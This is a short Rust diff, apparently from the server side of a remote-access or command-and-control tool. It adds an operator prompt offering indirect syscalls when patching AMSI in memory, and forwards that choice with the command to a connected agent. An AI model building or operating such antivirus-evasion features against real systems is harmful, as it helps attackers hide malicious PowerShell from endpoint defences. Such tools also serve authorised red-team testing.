@@ -308,6 +308,7 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                 print!("Do you want to patch the AMSI in memory or not ? [Y/N] ");
                                 io::stdout().flush().unwrap();
                                 let mut amsi = String::new();
+                                let mut syscalls_value = String::new();
                                 io::stdin().read_line(&mut amsi).expect("[-] Input issue");
                                 if !amsi
                                     .trim_end_matches('\0')
@@ -316,10 +317,27 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                 {
                                     log::info!("[+] Starting PowerShell without patching the AMSI, please wait...");
                                 } else {
-                                    log::info!("[+] Starting PowerShell and patching the AMSI, please wait...");
+                                    print!("Do you want to use indirect syscalls ? [Y/N] ");
+                                    io::stdout().flush().unwrap();
+                                    io::stdin()
+                                        .read_line(&mut syscalls_value)
+                                        .expect("[-] Input issue");
+                                    if !syscalls_value
+                                        .trim_end_matches('\0')
+                                        .trim_end()
+                                        .eq_ignore_ascii_case("Y")
+                                    {
+                                        log::info!("[+] Starting PowerShell and patching the AMSI without indirect syscalls, please wait...");
+                                    } else {
+                                        log::info!("[+] Starting PowerShell and patching the AMSI with indirect syscalls, please wait...");
+                                    }
                                 }
                                 match stream.write(
-                                    (cmd.trim_end_matches('\0').to_owned() + ":" + &amsi)
+                                    (cmd.trim_end_matches('\0').to_owned()
+                                        + ":"
+                                        + &amsi
+                                        + ":"
+                                        + &syscalls_value)
                                         .as_bytes(),
                                 ) {
                                     Ok(_) => (),
